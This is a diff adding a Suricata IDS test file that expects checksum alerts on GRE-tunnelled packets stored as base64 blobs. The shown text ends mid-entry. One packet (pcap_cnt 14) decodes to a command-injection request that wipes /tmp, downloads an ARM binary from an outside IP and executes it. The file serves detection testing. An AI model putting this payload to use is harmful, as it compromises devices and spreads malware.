@@ -1,0 +1,1448 @@
+requires:
+  min-version: 5
+
+args:
+- -k none
+- --set stream.midstream=true
+
+checks:
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABeS0QAAP4vFjLmL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUAACxj/wAAMAZHpilsNIoobiMXhQAAUDLEbCIAAAAAYAIgiXRTAAACBAWgAAA=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 1
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABmUGoAAP4vEQTmL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUAADQ+Q0AAMAYtWilsNIoobiMX1PgAUJFLVg6v9/DugBAFtAuKAAABAQgKAABo1j0Qgug=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 11
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABeS0sAAP4vFivmL9KMAOvvShAAiL4AAAAAEAcABQAAACA4F+HtCykAIFL/AwIIAEUAACzTgkAAPwaJIihuIxcpbDSKAFCFAPCtIJkyxGwjYBI5CEpoAAACBAW0AAA=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 4
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABuUGsAAP4vEPvmL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUAADyyiUAAQAaCRClsNIrEGdTP1PgAUEmoMHwAAAAAoAI5CPmbAAACBAW0BAIICj0QgvUAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 13
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABm0HQAAB0vcf48X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUAADQ+Q0AALwZgwClsNIp+yzlA1PgAUJFLVg6v9/DugBAFtD3wAAABAQgKAABo1j0Qgug=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 12
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABeym0AAB0veA08X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUAACzTgkAAQAa6iH7LOUApbDSKAFCFAPCtIJkyxGwjYBI5CHzOAAACBAW0AAA=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 3
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABuznoAAB0vc/A8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUAADw+QkAALwZguSlsNIp+yzlA1PgAUJFLVg0AAAAAoAIW0F+XAAACBAWgBAIICgAAaE8AAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 8
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABuTnkAAP4vEu3mL9KMAOvvShAAiL4AAAAAEAcABQAAACA4F+HtCykAIFL/AwIIAEUAADzogkAAPwZ0EihuIxcpbDSKAFDU+K/38O2RS1YOoBI4kKpoAAACBAW0BAIICj0QgugAAGhPAQMDBw==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 10
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABuzoEAAB0vc+k8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUAADzogkAAQAaleH7LOUApbDSKAFDU+K/38O2RS1YOoBI4kNzOAAACBAW0BAIICj0QgugAAGhPAQMDBw==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 9
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABeymkAAB0veBE8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUAACxj/wAALwZ7DClsNIp+yzlAhQAAUDLEbCIAAAAAYAIgiaa5AAACBAWgAAA=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 2
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABmUHAAAP4vEP7mL9KMAOvvShAAiL4AAAAAEAcABQAAACA4F+HtCykAIFL/AwIIAEUAADRyG0AAPwbqgShuIxcpbDSKAFDU+K/38O6RS1b+gBAAeg/FAAABAQgKPRCC9gAAaNc=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 23
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABuTnEAAP4vEvXmL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUAADw+QkAAMAYtUylsNIoobiMX1PgAUJFLVg0AAAAAoAIW0C0xAAACBAWgBAIICgAAaE8AAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 7
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABuUG4AAP4vENjmL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUgADxGxkAAMQYjrylsNIoobiMX1QIAUJFVLhEAAAAAoAIW0FSRAAACBAWgBAIICgAAaNcAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 16
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABmUNAAAP4vEJ7mL9KMAOvvShAAiL4AAAAAEAcABQAAACA4F+HtCykAIFL/AwIIAEUAADRyHEAAPwbqgChuIxcpbDSKAFDU+K/38O6RS1b/gBAAeg/AAAABAQgKPRCC+gAAaNc=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 25
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABmUG0AAP4vEOHmL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUgADQ+RUAAMQYsOClsNIoobiMX1PgAUJFLVv6v9/DugBEFtAqYAAABAQgKAABo1z0Qgug=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 15
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABu0HsAAB0vcc88X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADz2gkAAQAaXWH7LOUApbDSKAFDVAg3fUQCRVS4SoBI4kEYnAAACBAW0BAIICj0QgvYAAGjXAQMDBw==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 20
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABm0HwAAB0vcfY8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUAADRyG0AAQAYb6H7LOUApbDSKAFDU+K/38O6RS1b+gBAAekIrAAABAQgKPRCC9gAAaNc=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 22
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABazRIAAB0vdWw8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUAACgAAEAALwafDylsNIp+yzlAhQAAUDLEbCMAAAAAUAQAAN7nAAAAAAAAAAA=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 6
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABuUG8AAP4vENfmL9KMAOvvShAAiL4AAAAAEAcABQAAACA4F+HtCykAIFL/AwIIAEUgADz2gkAAPwZl8ihuIxcpbDSKAFDVAg3fUQCRVS4SoBI4kBPBAAACBAW0BAIICj0QgvYAAGjXAQMDBw==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 21
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAAFWUGwAAP4vEBLmL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUAASQ+REAAMAYsaSlsNIoobiMX1PgAUJFLVg6v9/DugBgFtFzUAAABAQgKAABo1z0QguhHRVQgL3NoZWxsP2NkKy90bXA7cm0rLXJmKyo7d2dldCsgaHR0cDovLzIzLjk0LjcuMTc1Ly5zNHkvYXJtO3NoKy90bXAvYXJtIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBIZWxsbywgd29ybGQNCkhvc3Q6IDEyNy4wLjAuMTo4MA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 14
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABaTT0AAP4vFD3mL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUAACgAAEAAMAZrqSlsNIoobiMXhQAAUDLEbCMAAAAAUAQAAKyBAAAAAAAAAAA=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 5
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABufSoAAP4v5DvmL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUAADyyi0AAQAaCQilsNIrEGdTP1PgAUEmoMHwAAAAAoAI5CPhvAAACBAW0BAIICj0QhCEAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 35
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABuXSkAAP4vBD3mL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUAADyyikAAQAaCQylsNIrEGdTP1PgAUEmoMHwAAAAAoAI5CPk3AAACBAW0BAIICj0Qg1kAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 33
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABm0HoAAB0vcdg8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUgADQ+RUAAMAZfnilsNIp+yzlA1PgAUJFLVv6v9/DugBEFtDz+AAABAQgKAABo1z0Qgug=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 19
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABm0ekAAB0vcGk8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUgADRGx0AAMAZXHClsNIp+yzlA1QIAUJFVLhIN31EBgBAFtKdKAAABAQgKAABpXD0QgvY=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 28
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABuXrYAAP4vApDmL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUgADwAbkAAQAY0QClsNIrEGdTP1QIAUNIWg24AAAAAoAI5CB2/AAACBAW0BAIICj0Qg2cAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 34
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABuvbUAAP4vo7DmL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUAADyyjEAAQAaCQSlsNIrEGdTP1PgAUEmoMHwAAAAAoAI5CPbeAAACBAW0BAIICj0QhbIAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 37
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABu0HkAAB0vcdE8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMACQ8JAAAAIFL/AwAIAEUgADxGxkAAMAZXFSlsNIp+yzlA1QIAUJFVLhEAAAAAoAIW0Ib3AAACBAWgBAIICgAAaNcAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 18
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFAABm0NkAAB0vcZk8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUAADRyHEAAQAYb537LOUApbDSKAFDU+K/38O6RS1b/gBAAekImAAABAQgKPRCC+gAAaNc=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 24
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABmUhAAAP4vDz7mL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUgADRGyEAAMQYjtSlsNIoobiMX1QIAUJFVLhIN31EBgBEFtHTjAAABAQgKAABpXD0QgvY=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 27
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABm0goAAB0vcEg8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADTSAkAAQAa74H7LOUApbDSKAFDVAg3fUQGRVS4TgBAAcqx9AAABAQgKPRCDBAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 31
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmyFUAAB0vef08X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADTSBUAAQAa73X7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqWpAAABAQgKPRCJ1wAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 47
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABmUg8AAP4vDz/mL9KMAOvvShAAiL4AAAAAEAcABQAAABIAIFL/AwI4F+HtCykIAEUgADRGx0AAMQYjtilsNIoobiMX1QIAUJFVLhIN31EBgBAFtHTkAAABAQgKAABpXD0QgvY=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 26
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABmudgAAB0viHo8X8/rAOvvShAAiL4AAAAAEAMAAgAAAAMAPBBZuHEAIFL/AwAIAEUgADTSBEAAPwa83n7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqX3AAABAQgKPRCJiQAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 46
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABuLaEAAP4vM6XmL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUgADwAcUAAQAY0PSlsNIrEGdTP1QIAUNIWg24AAAAAoAI5CBhEAAACBAW0BAIICj0QiOIAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 40
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jED9CABFIABm4kkAAB0vYAk8X8/rAOvvShAAiL4AAAAAEAMAAgAABYAAIFL/AwAACQ8JAAAIAEUgADTSBkAAQAa73H7LOUApbDSKAFDVAg3fUQGRVS4TgBEAcqUNAAABAQgKPRCKcwAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 49
+      proto: GRE
+      src_ip: 60.95.207.235
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABuf8AAAP4v4YXmL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUgADwAb0AAQAY0PylsNIrEGdTP1QIAUNIWg24AAAAAoAI5CBz3AAACBAW0BAIICj0QhC8AAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 36
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFAABuKuIAAP4vNoTmL9KMAOvvShAAiL4AAAAAEAIABwAAAGUAUFabqYUACQ8JAAEIAEUAADyyjUAAQAaCQClsNIrEGdTP1PgAUEmoMHwAAAAAoAI5CPO8AAACBAW0BAIICj0QiNQAAAAAAQMDAg==
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 39
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
+      alert.signature: SURICATA IPv4 invalid checksum
+      alert.signature_id: 2200073
+      dest_ip: 0.235.239.74
+      event_type: alert
+      packet: AAAAAAAADND4jGd9CABFIABmUi8AAP4vDx/mL9KMAOvvShAAiL4AAAAAEAcABQAAACA4F+HtCykAIFL/AwIIAEUgADTSAkAAPwaKeihuIxcpbDSKAFDVAg3fUQGRVS4TgBAAcnoXAAABAQgKPRCDBAAAaVw=
+      packet_info.linktype: 1
+      payload_printable: ''
+      pcap_cnt: 32
+      proto: GRE
+      src_ip: 230.47.210.140
+      stream: 0
+- filter:
+    count: 1
+    match:
+      alert.action: allowed
+      alert.category: Generic Protocol Command Decode
+      alert.gid: 1
+      alert.rev: 2
+      alert.severity: 3
